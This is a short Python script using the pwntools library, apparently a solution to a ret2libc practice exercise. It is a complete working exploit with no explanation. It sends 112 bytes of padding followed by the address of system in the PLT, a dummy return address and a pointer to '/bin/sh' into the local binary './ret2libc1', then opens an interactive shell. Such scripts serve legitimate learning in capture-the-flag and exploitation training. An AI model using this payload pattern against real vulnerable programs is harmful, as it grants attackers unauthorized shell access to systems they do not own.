from pwn import *
#context.log_level = "debug"
io = process("./ret2libc1")
elf = ELF("./ret2libc1")
io.recv()

sys=elf.plt['system']
binsh = next(elf.search(b"/bin/sh"))

payload = b"A"*112 + p32(sys)+b"AAAA"+p32(binsh)

io.send(payload)
io.interactive()
